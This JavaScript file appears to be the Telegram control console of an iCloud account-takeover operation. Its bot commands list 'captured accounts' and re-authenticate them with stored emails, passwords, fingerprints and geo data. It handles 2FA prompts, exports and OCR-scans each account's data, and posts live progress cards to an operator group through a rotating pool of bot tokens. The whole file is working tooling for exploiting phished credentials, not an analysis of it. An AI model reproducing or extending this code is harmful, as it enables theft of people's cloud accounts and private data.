import { Bot, InlineKeyboard } from "grammy";
import { config } from "../config.js";
import {
  PAGE_SIZE,
  menuView,
  listView,
  itemView,
  statsView,
  confirmDeleteView,
  escapeHtml,
  accountCard,
  accountStatsView,
  accountListView,
  accountDetailView,
  poolEventView,
} from "./views.js";

/* Telegram operator console.
 *
 * Three (or more) bots are loaded from TELEGRAM_BOT_TOKENS.  tokens[0] polls
 * for commands and callbacks; outbound cards/step logs are round-robin across
 * every token, so one group gets three independent rate budgets.  A card is
 * edited in place by the same bot that sent it (Telegram only lets the sender
 * edit a message), and every meaningful pool event is also posted as its own
 * append-only log line.
 *
 * The bot is outside the job hot path: events only enqueue work and a 2.5s
 * coalescing timer edits one card per account.
 */

const EDIT_INTERVAL_MS = 2500;
const SEND_OPTIONS = {
  parse_mode: "HTML",
  link_preview_options: { is_disabled: true },
};

export function startBot({ store, pool, io }) {
  const tokens = config.telegram.tokens?.length
    ? config.telegram.tokens
    : [config.telegram.token].filter(Boolean);

  if (!config.telegram.enabled || tokens.length === 0) {
    console.log("[telegram] disabled (set TELEGRAM_ENABLED, TELEGRAM_BOT_TOKENS, TELEGRAM_CHAT_ID)");
    return null;
  }

  const bots = tokens.map((token) => new Bot(token));
  const primary = bots[0];
  let operatorChat = config.telegram.chatId;
  let roundRobin = 0;

  const lastText = new Map();
  const lastEditAt = new Map();
  const timers = new Map();
  const pending = new Map();
  const sending = new Set();
  const lastState = new Map();
  const milestones = new Map();
  const progressMessages = new Map();

  const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

  function chatId() {
    return operatorChat || config.telegram.chatId;
  }

  function retryAfter(error) {
    return (
      error?.parameters?.retry_after ??
      error?.error?.parameters?.retry_after ??
      error?.payload?.parameters?.retry_after ??
      0
    );
  }

  function notModified(error) {
    return String(error?.description || error?.message || "").includes(
      "message is not modified"
    );
  }

  function messageGone(error) {
    return /message to edit not found|message can't be edited|MESSAGE_ID_INVALID/i.test(
      String(error?.description || error?.message || "")
    );
  }

  async function call(fn) {
    try {
      return await fn();
    } catch (error) {
      const wait = retryAfter(error);
      if (wait) {
        await sleep(wait * 1000 + 250);
        return fn();
      }
      throw error;
    }
  }

  function nextBotIndex() {
    const index = roundRobin % bots.length;
    roundRobin = (roundRobin + 1) % bots.length;
    return index;
  }

  function botIndexFor(account) {
    const stored = Number(account?.telegramBot);
    if (Number.isInteger(stored) && stored >= 0 && stored < bots.length) {
      return stored;
    }
    // A card from before the token pool was almost certainly sent by the
    // first token; try it before falling back to a fresh round-robin card.
    if (account?.telegramMessageId) return 0;
    return nextBotIndex();
  }

  /* -------------------------------------------------------------- card edits */

  async function flush(accountId, force = false) {
    timers.delete(accountId);
    const item = pending.get(accountId);
    if (!item || !chatId()) return;
    const account = store.getAccount(accountId);
    if (!account) return;
    if (!force && lastText.get(accountId) === item.text) {
      pending.delete(accountId);
      return;
    }
    if (!force) {
      const wait = EDIT_INTERVAL_MS - (Date.now() - (lastEditAt.get(accountId) ?? 0));
      if (wait > 0) {
        timers.set(
          accountId,
          setTimeout(() => flush(accountId, false), wait + 50)
        );
        return;
      }
    }
    if (sending.has(accountId)) return;
    sending.add(accountId);
    pending.delete(accountId);

    let index = botIndexFor(account);
    const options = { ...SEND_OPTIONS, reply_markup: panelKeyboard() };
    if (process.env.TELEGRAM_DEBUG === "1") {
      console.log(
        `[telegram] flush ${account.email} bot=${index} message=${account.telegramMessageId ?? "new"} chars=${item.text.length}`
      );
    }
    try {
      if (account.telegramMessageId) {
        try {
          await call(() =>
            bots[index].api.editMessageText(
              chatId(),
              account.telegramMessageId,
              item.text,
              options
            )
          );
          if (Number(account.telegramBot) !== index) {
            store.updateAccount(account.id, { telegramBot: index });
          }
        } catch (error) {
          if (notModified(error)) {
            lastText.set(accountId, item.text);
            lastEditAt.set(accountId, Date.now());
            return;
          }
          if (!messageGone(error)) throw error;
          // The stored card belongs to another token (or was deleted): start a
          // fresh one with the token we were assigned.
          store.updateAccount(account.id, {
            telegramMessageId: null,
            telegramBot: index,
          });
        }
      }
      if (!store.getAccount(account.id)?.telegramMessageId) {
        const message = await call(() =>
          bots[index].api.sendMessage(chatId(), item.text, options)
        );
        store.updateAccount(account.id, {
          telegramMessageId: message.message_id,
          telegramBot: index,
        });
      }
      lastText.set(accountId, item.text);
      lastEditAt.set(accountId, Date.now());
    } catch (error) {
      if (retryAfter(error)) {
        timers.set(
          accountId,
          setTimeout(() => flush(accountId, true), retryAfter(error) * 1000 + 100)
        );
      } else if (!notModified(error)) {
        console.error("[telegram] card", error.description ?? error.message);
      }
    } finally {
      sending.delete(accountId);
      if (pending.has(accountId) && !timers.has(accountId)) {
        timers.set(
          accountId,
          setTimeout(() => flush(accountId, false), EDIT_INTERVAL_MS + 50)
        );
      }
    }
  }

  function queueCard(accountId, text, force = false) {
    if (!chatId()) return;
    pending.set(accountId, { text });
    if (timers.has(accountId)) return;
    if (force) {
      flush(accountId, true);
    } else {
      const wait = EDIT_INTERVAL_MS - (Date.now() - (lastEditAt.get(accountId) ?? 0));
      timers.set(accountId, setTimeout(() => flush(accountId, false), Math.max(wait, 0) + 50));
    }
  }

  function refreshCard(account, force = false) {
    if (!account) return;
    queueCard(account.id, accountCard(account), force);
  }

  /* ------------------------------------------------------------- event logs */

  async function sendEvent(account, text) {
    if (!chatId() || !text) return;
    const index = nextBotIndex();
    try {
      await call(() =>
        bots[index].api.sendMessage(chatId(), text.slice(0, 4000), SEND_OPTIONS)
      );
    } catch (error) {
      console.error(
        `[telegram] event (bot ${index + 1}/${bots.length})`,
        error.description ?? error.message
      );
    }
  }

  function bucketOf(done, total) {
    const d = Number(done) || 0;
    const t = Number(total) || 0;
    if (t <= 0) return 0;
    return Math.min(10, Math.floor((d / t) * 10));
  }

  function milestone(key, bucket) {
    if (milestones.get(key) === bucket) return false;
    milestones.set(key, bucket);
    return true;
  }

  function progressKind(type) {
    if (type.startsWith("export_")) return "export";
    if (type.startsWith("scan")) return "scan";
    if (type.startsWith("import")) return "import";
    return null;
  }

  /* One message per account/workload that is edited from start -> progress ->
   * final summary.  A scan/export produces a single message that ends as the
   * report instead of a trail of 10%-step messages. */
  async function sendProgress(account, kind, text) {
    if (!chatId() || !text) return;
    const key = `${account.id}:${kind}`;
    const body = text.slice(0, 4000);
    const entry = progressMessages.get(key);

    if (entry) {
      try {
        if (entry.lastText === body) return;
        await call(() =>
          bots[entry.bot].api.editMessageText(
            chatId(),
            entry.messageId,
            body,
            SEND_OPTIONS
          )
        );
        entry.lastText = body;
        return;
      } catch (error) {
        if (notModified(error)) {
          entry.lastText = body;
          return;
        }
        if (!messageGone(error)) {
          console.error(
            `[telegram] progress edit (${kind})`,
            error.description ?? error.message
          );
          return;
        }
        progressMessages.delete(key);
      }
    }

    const index = nextBotIndex();
    try {
      const message = await call(() =>
        bots[index].api.sendMessage(chatId(), body, SEND_OPTIONS)
      );
      progressMessages.set(key, {
        bot: index,
        messageId: message.message_id,
        lastText: body,
      });
    } catch (error) {
      console.error(
        `[telegram] progress send (${kind})`,
        error.description ?? error.message
      );
    }
  }

  function onPoolEvent(type, payload = {}) {
    const accountId = payload.account?.id;
    if (!accountId) return;
    const account = store.getAccount(accountId) ?? payload.account;
    if (!account) return;

    if (type === "state") {
      const key = `${account.id}:state`;
      const label = `${payload.state || ""}:${payload.message || ""}`;
      if (lastState.get(key) === label) return;
      lastState.set(key, label);
    }

    if (type === "export_start" || type === "scan_start" || type === "import_start") {
      milestones.delete(`${account.id}:export`);
      milestones.delete(`${account.id}:scan`);
    }

    // Only post progress at each 10% so one slow export cannot flood the group;
    // the live card is still refreshed (throttled) on every event.
    if (type === "export_progress") {
      const progress = payload.progress || account.export || {};
      const bucket = bucketOf(
        progress.overallDone ?? progress.done,
        progress.overallTotal ?? progress.total
      );
      if (milestone(`${account.id}:export`, bucket)) {
        const text = poolEventView(type, account, payload);
        if (text) sendProgress(account, "export", text).catch(() => {});
        refreshCard(account, true);
      } else {
        refreshCard(account);
      }
      return;
    }

    if (type === "scan_progress") {
      const scan = payload.scan || account.scan || {};
      const bucket = bucketOf(scan.done, scan.total);
      if (milestone(`${account.id}:scan`, bucket)) {
        const text = poolEventView(type, account, payload);
        if (text) sendProgress(account, "scan", text).catch(() => {});
        refreshCard(account, true);
      } else {
        refreshCard(account);
      }
      return;
    }

    const text = poolEventView(type, account, payload);
    const kind = progressKind(type);
    if (text) {
      if (kind) sendProgress(account, kind, text).catch(() => {});
      else sendEvent(account, text).catch(() => {});
    }

    if (type === "state") {
      refreshCard(account);
      return;
    }
    if (type === "auth_start" || type === "email_entered" || type === "twofa" || type === "result" || type === "error") {
      refreshCard(account, true);
      return;
    }
    refreshCard(account, type === "account_info" || type === "export_done" || type === "scan");
  }

  /* ------------------------------------------------------------- rendering */

  function panelKeyboard() {
    return new InlineKeyboard().url("Open panel", config.admin.panelUrl);
  }

  async function edit(ctx, view) {
    const options = { ...SEND_OPTIONS, reply_markup: view.keyboard };
    try {
      await ctx.editMessageText(view.text, options);
    } catch (error) {
      if (notModified(error)) return;
      await ctx.reply(view.text, options).catch(() => {});
    }
  }

  function rememberChat(ctx) {
    operatorChat = String(ctx.chat?.id ?? operatorChat ?? "");
  }

  function accountPage(page = 1) {
    return accountListView(
      store.listAccounts({ page, pageSize: PAGE_SIZE }),
      store.accountsStats()
    );
  }

  /* ---------------------------------------------------------------- commands */

  primary.command("start", (ctx) => {
    rememberChat(ctx);
    return ctx.reply(
      [
        "<b>iCloud console</b>",
        "",
        `Bot pool: ${bots.length} tokens · commands on this bot, logs on all.`,
        "",
        "Use 👤 Accounts to browse, open, re-auth, export, OCR-scan,",
        "verify and ping every captured account.",
        "",
        escapeHtml(config.admin.panelUrl),
      ].join("\n"),
      {
        parse_mode: "HTML",
        reply_markup: panelKeyboard(),
        link_preview_options: { is_disabled: true },
      }
    );
  });

  primary.command("panel", (ctx) => {
    rememberChat(ctx);
    return primary.api.sendMessage(ctx.chat.id, "Use /menu to open the console.", {
      parse_mode: "HTML",
      reply_markup: menuView().keyboard,
    });
  });

  primary.command("menu", (ctx) => {
    rememberChat(ctx);
    const view = menuView();
    return ctx.reply(view.text, {
      parse_mode: "HTML",
      reply_markup: view.keyboard,
    });
  });

  primary.command("accounts", (ctx) => {
    rememberChat(ctx);
    const view = accountPage(1);
    return ctx.reply(view.text, {
      parse_mode: "HTML",
      reply_markup: view.keyboard,
    });
  });

  primary.command("stats", (ctx) => {
    rememberChat(ctx);
    const view = accountStatsView(
      store.accountsStats(),
      store.jobsStats(),
      pool.slotStats()
    );
    return ctx.reply(view.text, {
      parse_mode: "HTML",
      reply_markup: view.keyboard,
    });
  });

  primary.command("list", (ctx) => {
    rememberChat(ctx);
    const view = listView(store.page({ page: 1, pageSize: PAGE_SIZE }));
    return ctx.reply(view.text, {
      parse_mode: "HTML",
      reply_markup: view.keyboard,
    });
  });

  /* ---------------------------------------------------------------- callbacks */

  primary.callbackQuery("noop", (ctx) => ctx.answerCallbackQuery());

  /* -------------------------------------------------- legacy submissions */

  primary.callbackQuery(/^list:(\d+)$/, async (ctx) => {
    const page = Number(ctx.match[1]);
    await ctx.answerCallbackQuery();
    await edit(ctx, listView(store.page({ page, pageSize: PAGE_SIZE })));
  });

  primary.callbackQuery(/^item:(.+)$/, async (ctx) => {
    const item = store.get(ctx.match[1]);
    if (!item) return ctx.answerCallbackQuery("No longer exists");
    await ctx.answerCallbackQuery();
    await edit(ctx, itemView(item));
  });

  primary.callbackQuery(/^set:([^:]+):(new|reviewed|done)$/, async (ctx) => {
    const [, id, status] = ctx.match;
    const item = store.update(id, { status });
    if (!item) return ctx.answerCallbackQuery("No longer exists");
    await ctx.answerCallbackQuery(`Marked ${status}`);
    await edit(ctx, itemView(item));
  });

  primary.callbackQuery(/^delask:(.+)$/, async (ctx) => {
    const item = store.get(ctx.match[1]);
    if (!item) return ctx.answerCallbackQuery("No longer exists");
    await ctx.answerCallbackQuery();
    await edit(ctx, confirmDeleteView(item));
  });

  primary.callbackQuery(/^del:(.+)$/, async (ctx) => {
    const item = store.remove(ctx.match[1]);
    if (!item) return ctx.answerCallbackQuery("No longer exists");
    await ctx.answerCallbackQuery("Deleted");
    await edit(ctx, listView(store.page({ page: 1, pageSize: PAGE_SIZE })));
  });

  primary.callbackQuery("stats", async (ctx) => {
    await ctx.answerCallbackQuery();
    await edit(
      ctx,
      accountStatsView(store.accountsStats(), store.jobsStats(), pool.slotStats())
    );
  });

  primary.callbackQuery("menu", async (ctx) => {
    await ctx.answerCallbackQuery();
    await edit(ctx, menuView());
  });

  primary.callbackQuery("close", async (ctx) => {
    await ctx.answerCallbackQuery();
    await ctx.deleteMessage().catch(() => {});
  });

  /* ------------------------------------------------------- account browser */

  primary.callbackQuery(/^accounts:(\d+)$/, async (ctx) => {
    const page = Number(ctx.match[1]);
    await ctx.answerCallbackQuery();
    await edit(ctx, accountPage(page));
  });

  primary.callbackQuery(/^acct:([^:]+)$/, async (ctx) => {
    const account = store.getAccount(ctx.match[1]);
    if (!account) return ctx.answerCallbackQuery("Account gone");
    await ctx.answerCallbackQuery();
    await edit(ctx, accountDetailView(account));
  });

  primary.callbackQuery(
    /^act:([^:]+):(auth|export|scan|verify|ping)$/,
    async (ctx) => {
      const [, id, action] = ctx.match;
      const account = store.getAccount(id);
      if (!account) return ctx.answerCallbackQuery("Account gone");
      try {
        let result;
        if (action === "auth") {
          result = await pool.startAuth({
            email: account.email,
            password: account.password,
            fingerprint: account.fingerprint,
            geo: account.geo,
          });
        } else if (action === "export") {
          result = await pool.startExport(id, { mode: "missing" });
        } else if (action === "scan") {
          result = await pool.startScan(id);
        } else if (action === "verify") {
          result = await pool.startVerify(id);
        } else {
          result = await pool.startPing(id);
        }
        await ctx.answerCallbackQuery(
          result?.reused ? `${action}: already running` : `${action}: queued`
        );
        await edit(ctx, accountDetailView(store.getAccount(id) ?? account));
      } catch (error) {
        await ctx.answerCallbackQuery(
          `${action} failed: ${error.message}`.slice(0, 190)
        );
      }
    }
  );

  primary.catch((error) => {
    console.error("[telegram]", error.error ?? error);
  });

  primary
    .start({
      onStart: async (info) => {
        console.log(
          `[telegram] @${info.username} polling; ${bots.length} token(s) in the send pool`
        );
        primary.api
          .setMyCommands([
            { command: "menu", description: "Open the control panel" },
            { command: "accounts", description: "Browse captured accounts" },
            { command: "stats", description: "Totals and worker slots" },
            { command: "list", description: "Raw submissions" },
          ])
          .catch(() => {});
        if (!chatId()) return;
        const view = menuView();
        primary.api
          .sendMessage(chatId(), `<b>🟢 Console ready</b>\n\n${view.text}`, {
            parse_mode: "HTML",
            reply_markup: view.keyboard,
            link_preview_options: { is_disabled: true },
          })
          .catch((error) =>
            console.error("[telegram] menu", error.description ?? error.message)
          );
      },
    })
    .catch((error) => console.error("[telegram] start", error));

  return {
    bots,
    bot: primary,
    onPoolEvent,
    notify: (account, title, extra) => {
      if (!account) return;
      refreshCard(account, true);
      if (title || extra) sendEvent(account, `ℹ️ <b>${escapeHtml(title)}</b>\n${escapeHtml(extra || "")}`);
    },
    stop: () =>
      Promise.allSettled(bots.map((bot) => bot.stop())).catch(() => {}),
  };
}
